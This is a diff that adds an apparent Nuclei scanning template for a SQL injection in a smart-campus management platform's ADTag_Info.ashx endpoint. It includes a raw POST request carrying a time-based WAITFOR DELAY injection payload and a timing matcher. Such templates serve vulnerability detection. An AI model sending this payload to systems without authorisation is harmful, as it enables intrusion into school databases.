@@ -1,0 +1,37 @@
+id: windor-ADTag_Info-sqli
+info:
+  name: 智慧校园管理平台 ADTag_Info.ashx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 智慧校园综合管理系统ADTag_Info接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/shgzyh0e6bg19gre
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: windor,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /Module/BPCj/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 50
+
+        action=exportExcel&sADId=';WAITFOR+DELAY+'0:0:5'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
